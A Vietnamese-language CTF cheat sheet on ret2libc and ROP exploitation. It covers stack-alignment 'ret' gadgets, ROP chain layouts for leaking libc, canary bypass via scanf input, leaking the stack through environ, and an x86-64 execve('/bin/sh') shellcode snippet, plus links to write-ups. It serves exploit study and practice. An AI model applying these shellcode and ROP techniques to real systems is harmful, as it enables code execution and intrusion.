# ret2libc-ROP

- Overview:
   * pwntools '/bin/sh':
    ```python
    next(libc.search(b'/bin/sh'))
    ```
   * Trong libc.so.6 có mọi gadgets, đôi khi không thể dùng tools để tìm được 1 số gadgets. VD: `syscall ; ret` [dicectf 2023 - bop].
   * Từ Ubuntu 18.04 trở đi, nếu việc thực thi thất bại tại những hàm như buffered_vfprintf() hay do_system() trong những file thực thi 64 bit là do ngay trước câu lệnh ret, đầu vùng nhớ stack được cấp phát 16 bytes cho việc gọi lệnh tại return address nên để thực thi được thì cần chèn thêm 1 ROPgadget "ret" vào trước câu lệnh cần thực thi để bỏ đi 1 stack 8 bytes đầu tiên và thực thi câu lệnh này nằm ở stack ngay sau đó.
    ```
    STACK:
    1. địa chỉ lệnh "ret"
    2. địa chỉ lệnh "pop rdi, ret"
    3. địa chỉ lưu chuỗi 
    4. địa chỉ hàm gets

    5. địa chỉ lệnh "ret"
    6. địa chỉ lệnh "pop rdi, ret"
    7. địa chỉ muốn được in (đọc chuỗi)
    8. địa chỉ hàm printf 
    # leak = printf thì sau printf lại phải dùng ret
    9. địa chỉ lệnh "ret"
    10. địa chỉ nào đó muốn return về.
    ```
    * Vậy nên để bypass tránh việc ghi đè canary ta chỉ cần nhập chữ cái (+, -, *, /) mà không thuộc format %lu thì phần tử đó sẽ bị skip, không thay đổi. VD: chall `Warmup` - UIT-2022-CTF . 
    * Lỗi ép kiểu là khi khai báo biến x là long (8 byte) nhưng khi xử lý điều kiện ép kiểu nó thành int (4 byte) dẫn đến sai về mặt giá trị so sánh (trên thanh ghi) => bug
    * Leak được LIBC thì có thể leak được stack thông qua biến environ trong LIBC.
    * Viết sheelcode cần set context.binary

    ```python
    ...
    elf = ELF('./vuln')
    context.binary = elf
    p = elf.process()
    ...

    shellcode = asm('''
         instruction assembly
         ...
    ''')

    OR

    context.arch = 'amd64'
    shellcode = asm(
        f'''
        xor rdi, rdi
        push rdi
        mov rdi, 0x68732f2f6e69622f
        push rdi
        mov rdi, rsp
        xor rdx, rdx
        xor rsi, rsi
        xor rax, rax
        add al, 0x3b
        syscall
        ''')
    ```


- Technique:
    * [CTF: No leak - close(fd)](https://blog.idiot.sg/2018-09-03/tokyowesterns-ctf-2018-load-pwn/) .
    * [CTF: BlindROP](https://soolidsnake.github.io/2018/07/15/blindx86_64_rop.html) .
    * BRUTEFORCE - `TWOSHOT - KMACTF2022` * ...

